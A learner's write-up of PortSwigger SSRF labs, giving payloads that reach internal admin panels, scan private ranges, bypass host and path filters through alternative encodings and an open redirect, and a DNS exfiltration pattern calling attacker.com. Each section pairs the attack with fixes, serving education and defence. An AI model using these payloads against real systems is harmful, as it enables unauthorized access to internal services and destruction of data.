# Server-Side Request Forgery (SSRF) — PortSwigger Web Security Academy

> Writeup covering the SSRF labs (OWASP Top 10 — A10: SSRF): 2 apprentice +
> 2 practitioner, plus the blind/out-of-band concept.
> Author: Yuri Vinhote · Tools: browser DevTools (fetch), Burp Suite

SSRF happens when an application takes a user-controlled URL/host and the
**server itself** fetches it. The attacker turns the server into a proxy into
places they could never reach directly: `localhost`, internal hosts
(`192.168.x.x`, `10.x.x.x`), and cloud metadata endpoints
(`169.254.169.254`). The root cause is trust in the network perimeter instead
of per-request authorization — internal services are often left unauthenticated
because "only our own servers can reach them."

---

## 1. Basic SSRF against the local server

The shop's **stock check** feature sent a server-side request to an internal
URL, carried in a user-controlled `stockApi` parameter:

```
stockApi=http://stock.weliketoshop.net:8080/product/stock/check?productId=1&storeId=2
```

**Attack**
1. Found the `stockApi` parameter in the stock-check POST (DevTools → Network → Payload).
2. Replaced its value with `http://localhost/admin`. The server fetched its own
   admin panel and returned the HTML — an interface not reachable from outside.
3. The admin HTML revealed the delete path: `/admin/delete?username=carlos`.
4. Re-sent with `stockApi=http://localhost/admin/delete?username=carlos` → user deleted.

The lab's own admin page confirmed the design flaw: *"Admin interface only
available if logged in as an administrator, or if requested from loopback."*

**Impact** — Full access to an internal-only admin interface and destructive
actions, from an unauthenticated external position.

**Fix** — Enforce authorization regardless of request origin; never trust
loopback/internal source as authentication. Allowlist fetchable URLs.

---

## 2. Basic SSRF against another back-end system

Same `stockApi` sink, but the target was an unknown host on the internal
network (`192.168.0.0/24`, port `8080`).

**Attack**
1. Used the SSRF to **scan the internal range** — one request per host,
   `stockApi=http://192.168.0.{i}:8080/admin` for i = 1..255 (console loop).
2. Read the responses: dead hosts returned `500`, the admin host returned `200`.
   The admin was at `192.168.0.189`.
3. Re-sent `stockApi=http://192.168.0.189:8080/admin/delete?username=carlos` → deleted.

**Impact** — The SSRF became an **internal network scanner**, mapping live hosts
and locating a hidden admin service.

**Fix** — Allowlist destinations; block private IP ranges; never pass user input
straight into the request function.

---

## 3. SSRF with blacklist-based input filter (practitioner)

The server blocked `localhost`, `127.0.0.1` and the path `/admin`. Blacklists
fail because the same resource can be written many ways.

**Attack — two filters bypassed**
1. **Host filter** — enumerated alternative representations of 127.0.0.1 and
   found working bypasses: `127.1`, `0`, and octal `0177.0.0.1` all reached the
   server; literal `127.0.0.1`/`localhost` were blocked.
2. **Path filter** — `/admin` was blocked. **Double URL-encoding** bypassed it:
   `/%2561dmin` → the filter decodes once to `%61dmin` (no match), the back-end
   decodes again to `/admin`. Capitalization (`/ADMIN`) also worked.
3. Final payload: `http://127.1/%2561dmin/delete?username=carlos` → user deleted.

**Impact** — SSRF achieved despite input filtering; same reach as an unfiltered
target.

**Fix** — Never rely on a blacklist. Use an allowlist of permitted hosts and
canonicalize/resolve the address before deciding, so alternative encodings
collapse to the same value.

---

## 4. SSRF with filter bypass via open redirection (practitioner)

Here the filter was stronger — `stockApi` only accepted a **relative path on the
legitimate host** (e.g. `/product/stock/check?productId=3&storeId=2`), so no
external/internal URL could be supplied directly. The target admin was at
`http://192.168.0.12:8080/admin`.

**Attack — chaining two vulnerabilities**
1. Found an **open redirect** in the site's own "next product" feature:
   `/product/nextProduct?currentProductId=4&path=<URL>` issued a 302 to the
   `path` value, unvalidated.
2. Pointed the SSRF at that allowed endpoint, with `path` set to the internal
   admin: `stockApi=/product/nextProduct?currentProductId=4&path=http://192.168.0.12:8080/admin`.
3. The server requested the allowed path, received a 302 to the internal admin,
   **followed the redirect**, and returned the admin HTML.
4. Repeated with `.../admin/delete?username=carlos` → user deleted.

**Impact** — A strict allowlist filter was defeated by chaining a low-severity
open redirect. Two medium/low bugs combined into a critical SSRF.

**Fix** — Validate and constrain redirect targets (open redirect is not
"harmless"); don't let the fetcher follow redirects to non-allowlisted hosts.

---

## Blind SSRF (out-of-band / OAST) — concept

In **blind** SSRF the server makes the request but the response is **not
reflected back** to the attacker, so internal content can't be read directly.
Detection uses **OAST (out-of-band)**: induce the server to hit an
attacker-controlled endpoint and observe the interaction (DNS/HTTP) arrive.

A PortSwigger lab demonstrates this via the `Referer` header (analytics software
fetches the URL in `Referer`). Setting `Referer` to a listener URL causes the
server to call it. What arrives is the server's own request — like a server-side
`curl` — leaking the back-end's `User-Agent` (tech-stack fingerprint) and egress
IP. The lab's firewall only permits Burp Collaborator, which is Burp Pro-only, so
the lab itself requires a paid tool; the technique and concept are the takeaway.

Advanced: data can sometimes be **exfiltrated out-of-band** by making the server
resolve `http://<secret>.attacker.com`, leaking `<secret>` in the DNS query.

---

## Key takeaway

SSRF is one bug with a huge blast radius: any feature where the server fetches a
user-supplied URL — "import from URL", "generate PDF", "webhook/callback",
"link preview", "check stock" — is a candidate, whatever the parameter is named.
Defenses fall in a predictable order: blacklists are bypassed with alternative
encodings, strict allowlists are bypassed by chaining an open redirect on an
allowed host, and even "blind" variants are detectable out-of-band. The only
sound defense is an allowlist of destinations, blocking internal ranges, not
following redirects off-allowlist, and never treating "the request came from
inside" as authentication.

This maps directly onto enterprise/ERP back-ends: any WebService that consumes
an external URL or integrates with internal services (banking APIs, rate feeds,
internal consoles) is where SSRF lives — and where a developer who knows the
system from the inside knows exactly where to look.

*Labs completed on PortSwigger Web Security Academy — authorized lab environment only.*
